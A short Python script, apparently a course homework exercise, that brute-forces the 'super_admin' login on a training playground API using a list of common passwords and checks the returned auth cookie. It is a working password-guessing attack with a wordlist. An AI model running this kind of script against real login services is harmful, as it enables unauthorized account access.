import requests
import time

url_auth = 'https://playground.learnqa.ru/ajax/api/get_secret_password_homework'
url_check = 'https://playground.learnqa.ru/ajax/api/check_auth_cookie'

login = 'super_admin'

passwords = [
    'password', '123456', '12345678', 'qwerty', '12345', '1234', '111111', '1234567', 'dragon', '123123',
    'baseball', 'abc123', 'monkey', 'letmein', 'trustno1', 'adobe123', 'welcome', 'login', 'admin', '1234567890',
    'photoshop', '1qaz2wsx', 'solo', 'starwars', 'sunshine', 'access', 'master', 'flower', 'shadow', 'passw0rd',
    'superman', 'michael', 'jesus', 'password1', 'princess', '696969', 'hottie', 'freedom', 'aa123456', 'qazwsx',
    'batman', 'zaq1zaq1', 'hello', 'charlie', '!@#$%^&*', 'whatever', 'donald', 'qwerty123', '123qwe', 'loveme',
    'azerty', '000000', '1q2w3e4r', '654321', '555555', 'lovely', '7777777', '888888'
]

# сортировка
passwords = sorted(set(passwords))

for password in passwords:
    response_auth = requests.post(url_auth, data={"login": login, "password": password})
    auth_cookie = response_auth.cookies.get("auth_cookie")

    if auth_cookie is None:
        continue

    response_check = requests.post(url_check, cookies={"auth_cookie": auth_cookie})
    if response_check.text == "You are authorized":
        print(f"Пароль найден: {password}")
        print(f"Ответ сервера: {response_check.text}")
        break
